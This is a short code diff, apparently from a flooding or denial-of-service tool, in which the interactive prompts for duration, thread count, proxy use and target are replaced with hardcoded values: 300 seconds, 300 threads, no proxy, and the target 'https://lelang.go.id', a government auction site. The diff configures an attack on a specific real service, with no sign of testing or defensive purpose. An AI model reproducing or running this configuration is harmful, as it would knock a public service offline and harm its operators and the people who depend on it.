@@ -23,10 +23,10 @@ def main() -> None:
     """Run main application."""
     show_logo()
     try:
-        time = check_number_input("time")
-        threads = check_number_input("threads")
-        use_proxy = check_proxy_input()
-        target = check_target_input()
+        time = 300
+        threads = 300
+        use_proxy = 0
+        target = "https://lelang.go.id"
 
         with AttackMethod(
             duration=time,
